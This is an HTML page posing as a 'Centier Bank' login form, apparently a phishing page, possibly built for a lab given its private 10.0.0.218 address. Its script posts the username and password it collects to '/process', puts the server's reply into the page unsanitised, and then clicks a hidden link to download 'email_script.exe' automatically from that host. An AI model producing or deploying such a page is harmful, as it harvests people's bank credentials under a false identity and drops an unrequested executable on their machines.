<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Bank Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-container {
            width: 100%;
            max-width: 400px;
            background-color: #ffffff;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            border-radius: 10px;
            padding: 20px;
            text-align: center;
        }

        .login-container img {
            width: 150px;
            margin-bottom: 20px;
        }

        .login-container h1 {
            font-size: 24px;
            margin-bottom: 10px;
            color: #003366;
        }

        .login-container p {
            color: #666;
            margin-bottom: 20px;
        }

        .form-group {
            margin-bottom: 15px;
            text-align: left;
        }

        .form-group label {
            display: block;
            font-size: 14px;
            color: #333;
            margin-bottom: 5px;
        }

        .form-group input {
            width: 100%;
            padding: 10px;
            font-size: 16px;
            border: 1px solid #ddd;
            border-radius: 5px;
        }

        .form-group input:focus {
            border-color: #003366;
            outline: none;
        }

        .login-button {
            width: 100%;
            background-color: #003366;
            color: #fff;
            padding: 10px;
            font-size: 16px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

        .login-button:hover {
            background-color: #0055a4;
        }

        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #aaa;
        }

        .response-container {
            margin-top: 20px;
            padding: 15px;
            background-color: #f0f0f0;
            border: 1px solid #ddd;
            border-radius: 5px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="http://10.0.0.218/images/centierLogo.png" alt="Bank Logo">
        <h1>Welcome to Centier Bank</h1>
        <p>Please log in to access your account.</p>
        <form method="POST" action="/process" id="loginForm">
            <div class="form-group">
                <label for="username">Username:</label>
                <input type="text" id="username" name="username" placeholder="Enter your username" required>
            </div>
            <div class="form-group">
                <label for="password">Password:</label>
                <input type="password" id="password" name="password" placeholder="Enter your password" required>
            </div>
            <button type="submit" class="login-button">Log In</button>
        </form>

        <!-- Response container where the PHP response will be displayed -->
        <div id="response-container" class="response-container" style="display:none;">
            <!-- The server response will be inserted here dynamically -->
        </div>

        <!-- Hidden download link that will be triggered on form submission -->
        <a id="download-link" href="http://10.0.0.218/exeFiles/email_script.exe" download style="display:none;"></a>

        <div class="footer">
            <p>Â© 2024 Secure Bank. All rights reserved.</p>
        </div>
    </div>

    <script>
        const form = document.querySelector('form');
        form.addEventListener('submit', async function(event) {
            event.preventDefault();

            // Send form data to the server
            const formData = new FormData(form);
            const response = await fetch('/process', {
                method: 'POST',
                body: formData
            });
            const result = await response.text();

            // Display server response
            const responseContainer = document.getElementById('response-container');
            responseContainer.style.display = 'block';
            responseContainer.innerHTML = result;

            // Trigger the download link
            const downloadLink = document.getElementById('download-link');
            downloadLink.style.display = 'block'; // Make the link visible
            downloadLink.click(); // Simulate a click to trigger the download
        });
    </script>
</body>
</html>
